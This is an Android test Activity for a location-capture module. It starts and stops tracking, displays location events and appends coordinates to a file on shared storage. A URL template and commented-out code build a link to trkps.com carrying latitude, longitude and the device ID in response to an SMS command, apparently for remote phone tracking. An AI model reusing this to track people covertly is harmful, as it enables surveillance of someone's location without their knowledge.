package com.vvt.locationcapture.tests;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.capture.location.LocationCaptureManagerImp;
import com.vvt.capture.location.LocationOnDemandListener;
import com.vvt.capture.location.R;
import com.vvt.capture.location.settings.LocationOption;
import com.vvt.capture.location.util.LocationCallingModule;
import com.vvt.events.FxLocationEvent;
import com.vvt.events.FxLocationMapProvider;
import com.vvt.events.FxLocationMethod;
import com.vvt.logger.FxLog;

public class Location_capture_testsActivity extends Activity {
	private static final String TAG = "Location_captureActivity";
	public static final String TIME_INTERVAL = "TIME_INTERVAL";
	public static final String TIME_OUT = "TIME_OUT";
	public static final String MODULE = "MODULE";
	public static final String KEEP_STATE = "KEEP_STATE";
	public static final String CELL_ID = "CELL_ID";
	public static final String G_LOC = "G_LOC";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WEB_SERVICE_FORM = "http://trkps.com/m.php?lat=%f&long=%f&t=%s&i=%s&z=5";
	private static final String DEFAULT_REF_ID_FOLDER = "/mnt/sdcard/data/data/location";
	
	private TextView mTextview;
	private Button mSettings;
	private Button mStartCapture;
	private Button mStopCapture;
	private LocationCaptureManagerImp mLocCapture;
	
	private String sPathToRefId;
	
	private LocationOption mSpec;
	
	private SharedPreferences prefs;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_reletive);
        
        prefs = PreferenceManager.getDefaultSharedPreferences(this);
        
        new SettingSpecDialog(this).show();
        
        mTextview = (TextView) findViewById(R.id.textView);
        mSettings = (Button) findViewById(R.id.settings);
        mStartCapture = (Button) findViewById(R.id.startCp_bt);
        mStopCapture = (Button) findViewById(R.id.stopCp_bt); 

        mSettings.setOnClickListener(new Settings());
        mStartCapture.setOnClickListener(new StartTrackingButton());
        mStopCapture.setOnClickListener(new StopTrackingButton());
        
        enableButton(false);
    }
    
    
    private void setSpec() {
    	mSpec = new LocationOption();
		mSpec.setCallingModule(LocationCallingModule.forValue(prefs.getInt(MODULE, LocationCallingModule.MODULE_PANIC.getNumber())));
		mSpec.setTrackingTimeInterval(prefs.getLong(TIME_INTERVAL, 300000));
		
		Toast.makeText(Location_capture_testsActivity.this, "Set spec OK!!", Toast.LENGTH_SHORT).show();
		Toast.makeText(Location_capture_testsActivity.this, String.format(
				"Mode : %s" +
				"\nisTrackingMode : %s" +
				"\nkeepState : %s" +
				"\nTimeOut : %s" +
				"\nInterval : %s",
				mSpec.getCallingModule(),
				mSpec.isTrackingMode(),
				mSpec.iskeepState(),
				mSpec.getTimeOut(),
				mSpec.getTrackingTimeInterval()), Toast.LENGTH_LONG).show();
    }
    
    private class Settings implements OnClickListener {

		public void onClick(View v) {
			new SettingSpecDialog(Location_capture_testsActivity.this).show();
		}
	}
    
    private class StartTrackingButton implements OnClickListener {

		public void onClick(View v) {
			
			enableButton(true);
			
			//set spec capture.
			setSpec();
	    	
	    	mLocCapture = new LocationCaptureManagerImp(Location_capture_testsActivity.this);
	    	mLocCapture.setEventListener( new EventListner());
	    	
	    	if(mSpec.getCallingModule() != LocationCallingModule.MODULE_LOCATION_ON_DEMAND) {
	    		Toast.makeText(Location_capture_testsActivity.this, "Start Tracking Capture", Toast.LENGTH_SHORT).show();
	    		mLocCapture.startLocationTracking(mSpec);
	    	} else {
	    		Toast.makeText(Location_capture_testsActivity.this, "Start Ondemand Capture", Toast.LENGTH_SHORT).show();
	    		mLocCapture.getLocationOnDemand(new LocationOnDemandListener() {
					
					@Override
					public void locationOnDemandUpdated(List<FxEvent> events) {
						Toast.makeText(Location_capture_testsActivity.this, "locationOnDemandUpdated", Toast.LENGTH_SHORT).show();
						
					}
					
					@Override
					public void LocationOndemandError(Throwable ex) {
						Toast.makeText(Location_capture_testsActivity.this, ex.getMessage(), Toast.LENGTH_SHORT).show();
						
					}
				});
	    	}
			
		}
	}
    
    private class StopTrackingButton implements OnClickListener { 

		public void onClick(View v) {
			
			enableButton(false);
			
			if(mLocCapture != null) {
				mLocCapture.stopLocationTracking(mSpec.getCallingModule());
			}
			
			if(mSpec != null) {
				mSpec = null;
			}
			Toast.makeText(Location_capture_testsActivity.this, "Stop Tracking Capture", Toast.LENGTH_LONG).show();
			
		}
	}
    
    class EventListner implements FxEventListener {

		@Override
		public void onEventCaptured(final List<FxEvent> events) {
			FxLog.d("EventListner", "onReceive # ENTER ...");
			
			Location_capture_testsActivity.this.runOnUiThread(new Runnable() {

				public void run() {
					StringBuilder builder = new StringBuilder();
                	builder.append("======= onReceive =======");
                	builder.append("\n");
                	builder.append(String.format("Event Count %d", events.size()));
                	builder.append("\n");
                	builder.append("======= Event Data =======");
                	builder.append("\n");
                	
                	FxLocationEvent locationEvent = null;
                	for(FxEvent e: events) { 
                		locationEvent = new FxLocationEvent();
                		locationEvent = (FxLocationEvent) e;
                		
                		builder.append(String.format("EventId : %s",locationEvent.getEventId()));
                		builder.append("\n");
                		builder.append(String.format("EventType : %s",locationEvent.getEventType()));
                		builder.append("\n");
                		builder.append(String.format("IsMockLocation : %s",locationEvent.isMockLocaion()));
                		builder.append("\n");
                		builder.append(String.format("Latitude : %s",locationEvent.getLatitude()));
                		builder.append("\n");
                		builder.append(String.format("Longitude : %s",locationEvent.getLongitude()));
                		builder.append("\n");
                		builder.append(String.format("Altitude : %s",locationEvent.getAltitude()));
                		builder.append("\n");
                		builder.append(String.format("Heading : %s",locationEvent.getHeading()));
                		builder.append("\n");
                		builder.append(String.format("HeadingAccuracy : %s",locationEvent.getHeadingAccuracy()));
                		builder.append("\n");
                		
                		String provider = "";
                		FxLocationMethod tempProviver = locationEvent.getMethod();
                		FxLocationMapProvider mapProviderEnum = locationEvent.getMapProvider();
                		
                		if(tempProviver.getNumber() == FxLocationMethod.INTERGRATED_GPS.getNumber()) {
                			provider = "INTERGRATED_GPS";
                		} else if (tempProviver.getNumber() == FxLocationMethod.AGPS.getNumber()) {
                			 provider = "AGPS";
                		} else if (tempProviver.getNumber() == FxLocationMethod.NETWORK.getNumber()) {
                			provider = "NETWORK";
                		} else if (tempProviver.getNumber() == FxLocationMethod.BLUETOOTH.getNumber()) {
                			provider = "BLUETOOTH";
                		} else if (tempProviver.getNumber() == FxLocationMethod.CELL_INFO.getNumber() 
                				&& mapProviderEnum == FxLocationMapProvider.PROVIDER_GOOGLE) {
                			provider = "G_LOCATION";
                		} else if (tempProviver.getNumber() == FxLocationMethod.CELL_INFO.getNumber() 
                				&& mapProviderEnum == FxLocationMapProvider.UNKNOWN) {
                			provider = "Unknown";
                		} else {
                			provider = "Unknown";
                		}
                		
                		
             
            		
                		String mapProvider = "Unknown";
                		
                		if(locationEvent.getMapProvider().getNumber() == FxLocationMapProvider.PROVIDER_GOOGLE.getNumber()) {
                			mapProvider = "PROVIDER_GOOGLE";
                		} else if(locationEvent.getMapProvider().getNumber() == FxLocationMapProvider.PROVIDER_NOKIA.getNumber()) {
                			mapProvider = "PROVIDER_NOKIA";
                		} else {
                			mapProvider = "Unknown";
                		}
                		
                		builder.append(String.format("Provider : %s",provider));
                		builder.append("\n");
                		builder.append(String.format("MapProvider : %s",mapProvider));
                		builder.append("\n");
                		builder.append(String.format("AreaCode : %s",locationEvent.getAreaCode()));
                		builder.append("\n");
                		builder.append(String.format("CellId : %s",locationEvent.getCellId()));
                		builder.append("\n");
                		builder.append(String.format("CellName : %s",locationEvent.getCellName()));
                		builder.append("\n");
                		builder.append(String.format("EventTime : %s",new Date(locationEvent.getEventTime())));
                		builder.append("\n");
                		builder.append(String.format("MobileCountryCode : %s",locationEvent.getMobileCountryCode()));
                		builder.append("\n");
                		builder.append(String.format("NetworkId : %s",locationEvent.getNetworkId()));
                		builder.append("\n");
                		builder.append(String.format("NetworkName : %s",locationEvent.getNetworkName()));
                		builder.append("\n");
                		builder.append(String.format("HorizontalAccuracy : %s",locationEvent.getHorizontalAccuracy()));
                		builder.append("\n");
                		builder.append(String.format("Speed : %s",locationEvent.getSpeed()));
                		builder.append("\n");
                		builder.append(String.format("SpeedAccuracy : %s",locationEvent.getSpeedAccuracy()));
                		builder.append("\n");
                		builder.append(String.format("VerticalAccuracy : %s",locationEvent.getVerticalAccuracy()));
                		builder.append("\n");
                	
                	
                		String keepLoc = String.format("\n======= ======= =======" +
            					"\nprovider : %s, " +
            					"\nlat : %s, " +
            					"\nLon : %s, " +
            					"\nAltitude : %s " +
            					"\nHeading : %s " +
            					"\nSpeed : %s, " +
            					"\nSpeedAccuracy %s, " +
            					"\nHorizontalAccuracy : %s,  " +
            					"\nVerticalAccuracy : %s", 
            					provider,
            					locationEvent.getLatitude(),
            					locationEvent.getLongitude(),
            					locationEvent.getAltitude(),
            					locationEvent.getHeading(),
            					locationEvent.getSpeed(),
            					locationEvent.getSpeedAccuracy(),
            					locationEvent.getHorizontalAccuracy(),
            					locationEvent.getVerticalAccuracy()
            					);
            			
                		keepLocation (keepLoc);
            			FxLog.d("EventListner", "onReceive # EXIT ...");
                	}
             
                	builder.append("======= ======= =======");
                	builder.append("\n");
                	builder.append(mTextview.getText());
                	builder.append("\n");
                	mTextview.setText(builder.toString());

        			FxLog.d("EventListner", "onReceive # EXIT ...");

				}
			});
			
			
		}
    	
    }
    
    private void writeFile(String path, String content){
		FxLog.v(TAG, "writeFile # ENTER ...");
//		File savepath = new File(path);	
//		BufferedWriter bWriter;
//		try {
//			bWriter = new BufferedWriter(new FileWriter(savepath, true), 256);
//			bWriter.write(content);
//			bWriter.flush();
//			bWriter.close();
//		} catch (IOException e) {
//			FxLog.e(TAG, String.format("writeFile # error: %s", e.getMessage()));
//		}
//		
		FileWriter fileWriter;
		try {
			File savepath = new File(path);
			fileWriter = new FileWriter(savepath, true);
			fileWriter.append(content);
			fileWriter.close();
		} catch (IOException e) {
			// cannot open file for writing or another IO error
		}
		FxLog.v(TAG, "writeFile # EXIT ...");
	}
    
    private void keepLocation(String locInfo){
		FxLog.v(TAG, "setRefTime # ENTER ...");
		writeFile(getFilename(),locInfo);
		FxLog.v(TAG, "setRefTime # EXIT ...");
	}
    
    
    private String getFilename(){
		FxLog.v(TAG, "getFilename # ENTER ...");
		File file = null;
		
		if(sPathToRefId == null) {
	        file = new File(DEFAULT_REF_ID_FOLDER);
		}
		else {
			file = new File(sPathToRefId);
		}
	    if(!file.exists()){
	    	file.mkdirs();
	    }
	    
	    FxLog.v(TAG, "PATH : "+(file.getAbsolutePath() + "/" + "loc.txt"));
	    
	    FxLog.v(TAG, "getFilename # EXIT ...");
        return (file.getAbsolutePath() + "/" + "loc.txt");
	}
    
    private void enableButton (boolean isStartTracking) {
    	
    	mSettings.setEnabled(!isStartTracking);
    	mStartCapture.setEnabled(!isStartTracking);
    	mStopCapture.setEnabled(isStartTracking);
    	
    } 
    
//    private String getWebLink(long time, double lat ,double lon) {
//    	  GregorianCalendar calendar = new GregorianCalendar();
//    	  calendar.setTimeInMillis(time);
//    	  
//    	  String year = String.valueOf(calendar.get(Calendar.YEAR));
//    	  
//    	  String month = String.valueOf(calendar.get(Calendar.MONTH) + 1);
//    	  if (month.length() < 2) month = String.format("0%s", month);
//    	  
//    	  String date = String.valueOf(calendar.get(Calendar.DATE));
//    	  if (date.length() < 2) date = String.format("0%s", date);
//    	  
//    	  String hour = String.valueOf(calendar.get(Calendar.HOUR));
//    	  if (hour.length() < 2) hour = String.format("0%s", hour);
//    	  
//    	  String min = String.valueOf(calendar.get(Calendar.MINUTE));
//    	  if (min.length() < 2) min = String.format("0%s", min);
//    	  
//    	  String timeParam = String.format("%s%s%s%s%s", year, month, date, hour, min);
//    	  
//    	  TelephonyManager tMan = (TelephonyManager) FxAppContext.getInstance().getContext().getSystemService(Context.TELEPHONY_SERVICE);
//    	  
//    	  return String.format(
//    	    LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WEB_SERVICE_FORM, 
//    	    lat, lon, timeParam, 
//    	    tMan.getDeviceId());
//    	 }
}